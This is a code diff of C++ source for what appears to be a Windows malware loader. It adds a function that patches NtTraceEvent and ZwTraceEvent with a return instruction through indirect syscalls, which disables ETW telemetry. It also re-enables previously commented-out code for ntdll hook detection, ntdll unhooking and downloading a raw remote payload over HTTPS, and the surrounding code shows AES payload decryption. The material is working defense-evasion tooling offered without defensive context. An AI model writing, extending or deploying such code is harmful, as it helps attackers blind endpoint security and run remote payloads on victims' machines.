@@ -76,6 +76,8 @@ constexpr auto ntwrite_Rotr32A = HashStringDjb2A("NtWriteVirtualMemory");
 constexpr auto ntquery_Rotr32A = HashStringDjb2A("NtQueryInformationThread");
 constexpr auto ntqueue_Rotr32A = HashStringDjb2A("NtQueueApcThread");
 constexpr auto ntresume_Rotr32A = HashStringDjb2A("NtResumeThread");
+constexpr auto nttraceevt_Rotr32A = HashStringDjb2A("NtTraceEvent");
+constexpr auto zwtraceevt_Rotr32W = HashStringDjb2A("ZwTraceEvent");
 
 // static variables
 char path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
@@ -233,7 +235,6 @@ FARPROC CustomGetProcAddress(IN HMODULE hModule, IN DWORD lpApiName) {
 // Detect if the first bytes of Nt address are hooked
 // Stolen from https://github.com/TheD1rkMtr
 BOOL isItHooked(LPVOID addr) {
-/*
     BYTE stub[] = "\x4c\x8b\xd1\xb8";
     std::string charData = (char*)addr;
 
@@ -251,7 +252,6 @@ BOOL isItHooked(LPVOID addr) {
         return TRUE;
     }
     return FALSE;
-*/
 }
 
 
@@ -259,7 +259,6 @@ BOOL isItHooked(LPVOID addr) {
 
 
 void unhooking() {
-/*
     // Copy ntdll to a fresh memory alloc and overwrite calls adresses
     // Stolen from https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
     printf("[+] Detecting ntdll hooking\n");
@@ -339,7 +338,6 @@ void unhooking() {
             printf("\t[+] NtQueryInformationThread Not Hooked\n");
         }
     }
-*/
 }
 
 
@@ -359,7 +357,6 @@ void unhooking() {
 *   Download a raw payload from an external website into a buffer
 */
 std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
-/*
     printf("[+] Downloading remote payload\n");
     HINTERNET hSession = WinHttpOpen(NULL,WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,WINHTTP_FLAG_SECURE_DEFAULTS);
     HINTERNET hConnect = WinHttpConnect(hSession,baseAddress,INTERNET_DEFAULT_HTTPS_PORT,0);
@@ -379,7 +376,6 @@ std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
     return buffer;
-*/
 }
 
 
@@ -436,6 +432,41 @@ PVOID CustomMemMove(PVOID dest, const PVOID src, SIZE_T len) {
 
 
 
+void evt_patch() {
+    void* pnttraceevt = CustomGetProcAddress(CustomGetModuleHandle(_ntdll), nttraceevt_Rotr32A);
+    printf("[+] Address of NtTraceEvent found : 0x%p\n", pnttraceevt);
+    void* pzwtraceevt = CustomGetProcAddress(CustomGetModuleHandle(_ntdll), zwtraceevt_Rotr32W);
+    printf("[+] Address of ZwTraceEvent found : 0x%p\n", pzwtraceevt);
+    char ret_patch[] = { 0xC3 };
+    DWORD lpflOldProtect = 0;
+    unsigned __int64 memPage = 0x1000;
+    void* pnttraceevt_bk = pnttraceevt;
+    void* pzwtraceevt_bk = pzwtraceevt;
+
+    FARPROC pNtProtectVirtualMemory = CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntprotect_Rotr32A);
+    // Getting syscall value of NtProtectVirtualMemory
+    UINT_PTR pNtProtectVirtualMemorySyscallID = (UINT_PTR)pNtProtectVirtualMemory + 4; // The syscall ID is typically located at the 4th byte of the function
+    syscallID = ((unsigned char*)(pNtProtectVirtualMemorySyscallID))[0];
+    syscallAddr = (UINT_PTR)pNtProtectVirtualMemory + 0x12; // (18 in decimal)
+    indirect_sys(GetCurrentProcess(), (PVOID*)&pnttraceevt_bk, (PSIZE_T)&memPage, PAGE_EXECUTE_READWRITE, &lpflOldProtect); // 0x04 for RW
+    indirect_sys(GetCurrentProcess(), (PVOID*)&pzwtraceevt_bk, (PSIZE_T)&memPage, PAGE_EXECUTE_READWRITE, &lpflOldProtect); // 0x04 for RW
+
+    FARPROC pNtWriteVirtualMemory = CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntwrite_Rotr32A);
+    // Getting syscall value of NtWriteVirtualMemory
+    UINT_PTR pNtWriteVirtualMemorySyscallID = (UINT_PTR)pNtWriteVirtualMemory + 4; // The syscall ID is typically located at the 4th byte of the function
+    syscallID = ((unsigned char*)(pNtWriteVirtualMemorySyscallID))[0];
+    syscallAddr = (UINT_PTR)pNtWriteVirtualMemory + 0x12; // (18 in decimal)
+    indirect_sys(GetCurrentProcess(), (LPVOID)pnttraceevt, (PVOID)ret_patch, sizeof(ret_patch), (PULONG)nullptr);
+    indirect_sys(GetCurrentProcess(), (LPVOID)pzwtraceevt, (PVOID)ret_patch, sizeof(ret_patch), (PULONG)nullptr);
+
+    syscallID = ((unsigned char*)(pNtProtectVirtualMemorySyscallID))[0];
+    syscallAddr = (UINT_PTR)pNtProtectVirtualMemory + 0x12; // (18 in decimal)
+    indirect_sys(GetCurrentProcess(), (PVOID*)&pnttraceevt_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
+    indirect_sys(GetCurrentProcess(), (PVOID*)&pzwtraceevt_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
+
+    printf("[+] ETW patched !\n");
+}
+
 
 
 
@@ -477,6 +508,12 @@ int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen
 
 
 
+
+
+
+
+
+// Execution functions definitions
 
 
 /**
